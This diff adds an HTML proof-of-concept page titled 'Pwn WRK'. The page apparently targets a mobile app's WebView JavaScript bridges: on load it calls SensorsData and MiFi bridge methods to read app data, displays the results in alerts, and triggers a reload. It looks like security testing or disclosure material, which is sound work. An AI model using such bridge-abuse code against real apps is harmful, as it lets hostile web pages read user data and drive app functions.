@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Pwn WRK </title>
+</head>
+<body>
+<p id="content">attackWRK </p>
+     
+<script>
+
+       function createXHR() {
+        if (typeof XMLHttpRequest != 'undefined') {
+            return new XMLHttpRequest();
+        } else if (typeof ActiveXObject != 'undefined') {
+            if (typeof arguments.callee.activeXString != 'string') {
+                var versions = ['MSXML2.XMLHttp.6.0', 'MSXML2.XMLHttp.3.0', 'MSXML2.XMLHttp'];
+                for (var i = 0; i < versions.length; i++) {
+                    try {
+                        var xhr = new ActiveXObject(versions[i]);
+                        arguments.callee.activeXString = versions[i];
+                        return xhr;
+                    } catch (ex) {
+                    }
+                }
+            }
+            return new ActiveXObject(arguments.callee.activeXString);
+        } else {
+            throw new Error('No XHR Object available');
+        }
+    }
+
+    function sendGetRequest(url, callback) {
+        var xhr = createXHR();
+        xhr.open('GET', url, false);
+        xhr.send();
+        callback(xhr.responseText);
+    }
+
+    function sendRequest(url) {
+        sendGetRequest(url, function (response) {
+            //document.getElementById("content").innerText = 'cctest : ' + response;
+        });
+    }
+    
+
+    
+    
+ attackXiaomiJr();   
+    
+ function attackXiaomiJr() {
+     
+        var getInfo=window.SensorsData_APP_JS_Bridge.sensorsdata_call_app();
+         alert(getInfo);
+   
+    var getInfo2=window.SensorsData_APP_JS_Bridge.sensorsdata_get_app_visual_config();
+         alert(getInfo2);
+   
+   
+     window.MiFiJsBridge.invoke('Reload', 'reload', null, null)
+       
+     
+ 
+
+     
+     
+ 
+  // var getUserInfo = window.SPJSBridge.getUserInfo();
+  // alert('getUserInfo:'+ getUserInfo);
+
+     
+
+     
+ } 
+     
+</script>
+</body>
+</html>
